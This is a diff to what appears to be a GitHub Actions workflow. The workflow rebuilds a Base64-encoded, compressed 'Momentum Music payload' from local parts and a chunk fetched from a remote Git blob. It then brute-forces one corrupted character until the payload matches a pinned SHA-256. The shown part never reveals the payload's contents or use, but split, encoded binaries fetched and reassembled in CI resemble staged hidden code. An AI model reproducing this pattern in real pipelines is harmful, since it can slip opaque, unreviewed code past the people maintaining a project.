@@ -56,7 +56,6 @@ jobs:
           prefix = "".join(part.read_text().strip() for part in prefix_parts)
           suffix = suffix_part.read_text().strip()
 
-          # Recover the original full 12,000-character middle chunk from its immutable Git blob.
           request = urllib.request.Request(
               "https://api.github.com/repos/stefanmelinte/plugin/git/blobs/ca273597bd7f851e7ebe15b05bfb961130af4710",
               headers={
@@ -79,17 +78,17 @@ jobs:
           encoded = prefix + middle + suffix
           compressed = bytearray(base64.b64decode(encoded, validate=True))
           current_hash = hashlib.sha256(compressed).hexdigest()
+          print(f"Encoded characters: {len(encoded)}")
           print(f"Current compressed SHA-256: {current_hash}")
 
-          corrected_middle = middle
           if current_hash != expected_compressed_hex:
-              # One character in the copied middle chunk was changed. A Base64 character affects
-              # only its 4-character quartet (3 decoded bytes), so test replacements without
-              # repeatedly decoding or reallocating the complete 41 KB payload.
+              # Search for one copied Base64 character anywhere in the payload. Replacing one
+              # character changes just three decoded bytes, so each candidate requires only a
+              # SHA-256 over the already-decoded 41 KB buffer, not another Base64 decode.
               found = None
-              prefix_length = len(prefix)
-              for local_position, original in enumerate(middle):
-                  global_position = prefix_length + local_position
+              for global_position, original in enumerate(encoded):
+                  if original == "=":
+                      continue
                   quartet_start = global_position - (global_position % 4)
                   quartet = list(encoded[quartet_start:quartet_start + 4])
                   byte_start = (quartet_start // 4) * 3
@@ -104,21 +103,22 @@ jobs:
                           replacement = base64.b64decode("".join(changed), validate=True)
                       except Exception:
                           continue
-                      compressed[byte_start:byte_start + 3] = replacement
+                      compressed[byte_start:byte_start + len(replacement)] = replacement
                       if hashlib.sha256(compressed).digest() == expected_compressed:
-                          found = (local_position, original, candidate, bytes(compressed))
+                          found = (global_position, original, candidate, bytes(compressed))
                           break
                   if found:
                       break
                   compressed[byte_start:byte_start + 3] = original_bytes
+                  if global_position and global_position % 10_000 == 0:
+                      print(f"Checked {global_position} encoded positions")
 
               if found is None:
-                  raise SystemExit("Could not recover the copied Momentum Music payload")
+                  raise SystemExit("Could not recover a single copied character in the Momentum Music payload")
 
               position, original, candidate, corrected = found
-              corrected_middle = middle[:position] + candidate + middle[position + 1:]
               compressed = bytearray(corrected)
-              print(f"Recovered middle chunk at offset {position}: {original!r} -> {candidate!r}")
+              print(f"Recovered payload at global offset {position}: {original!r} -> {candidate!r}")
 
           if hashlib.sha256(compressed).hexdigest() != expected_compressed_hex:
               raise SystemExit("Recovered compressed payload does not match its trusted SHA-256")
